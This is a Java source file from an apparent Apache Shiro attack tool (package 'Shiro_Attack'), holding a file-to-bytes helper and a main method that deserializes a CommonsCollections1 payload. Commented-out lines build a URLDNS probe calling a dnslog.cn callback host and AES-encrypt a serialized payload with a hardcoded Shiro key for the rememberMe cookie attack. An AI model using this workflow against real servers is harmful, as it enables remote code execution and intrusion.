package Shiro_Attack;

import Commons.*;

import java.io.*;
/*
class文件转byte[]。
 */
public class toByteArray {

    public static byte[] toByteArray(String filename) throws IOException {

        File f = new File(filename);
        if (!f.exists()) {
            throw new FileNotFoundException(filename);
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length());
        BufferedInputStream in = null;
        try {
            in = new BufferedInputStream(new FileInputStream(f));
            int buf_size = 1024;
            byte[] buffer = new byte[buf_size];
            int len = 0;
            while (-1 != (len = in.read(buffer, 0, buf_size))) {
                bos.write(buffer, 0, len);
            }
            return bos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
            throw e;
        } finally {
            try {
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            bos.close();
        }
    }


    public static void main(String[] args) throws Exception {

//        urldns.urldns("resourse/urldns.ser","http://rdgv8t.dnslog.cn");

//        CommonsCollections1.commonscollections1();
        Serializer1.UnSerializer("resourse/cc1.ser");
//        KeyDetection.Detection("resourse/keydetection.ser");
//          KeyDetection.urldns("resourse/urldns.ser","http://rdgv8t.dnslog.cn");
//         System.out.println(AesEncrypt.encrypt("hvH+bIzkPZ15mIgAxcaaaA==",toByteArray("resourse/keydetection.ser")));

//        byte[] bytes=new byte[16];
//        bytes[0]=-122;
//        bytes[1]=-15;
//        bytes[2]=-2;
//        bytes[3]=108;
//        bytes[4]=-116;
//        bytes[5]=-28;
//        bytes[6]=61;
//        bytes[7]=-99;
//        bytes[8]=121;
//        bytes[9]=-104;
//        bytes[10]=-120;
//        bytes[12]=-59;
//        bytes[13]=-58;
//        bytes[14]=-102;
//        bytes[15]=104;
//        System.out.println( Base64.encodeBase64String(bytes));

    }
}